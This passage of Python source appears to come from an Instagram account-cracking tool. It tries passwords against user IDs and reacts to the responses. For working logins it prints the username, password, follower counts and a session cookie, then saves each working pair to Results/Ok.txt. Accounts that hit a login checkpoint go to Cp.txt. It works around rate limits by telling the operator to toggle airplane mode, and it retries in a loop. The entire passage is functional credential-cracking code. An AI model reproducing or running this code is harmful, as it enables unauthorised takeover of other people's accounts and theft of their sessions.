                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{T}║ [{H}✔{T}]{A} Status {T}:{H} SUCCESS     ")
                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{H} {uid}")
                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{H} {pw}")
                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{H} {follower}")
                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{H} {following}")
                        print(f"{T}║ [{Z}>{T}]{A} Cookie :{H} {coki}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{T}║ [{M}✘{T}]{A} Status {T}:{K} CHECKPOINT    ")
                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{K} {uid}")
                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{K} {pw}")
                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{K} {follower}")
                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{K} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{P}[{M}!{P}]{M} Use Airplane Mode 2 Seconds", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{T}╚═➣ [{J}Crack{T}]{A} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{T}╚═➣ [{Z}!{T}]{J} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    ___menu___()
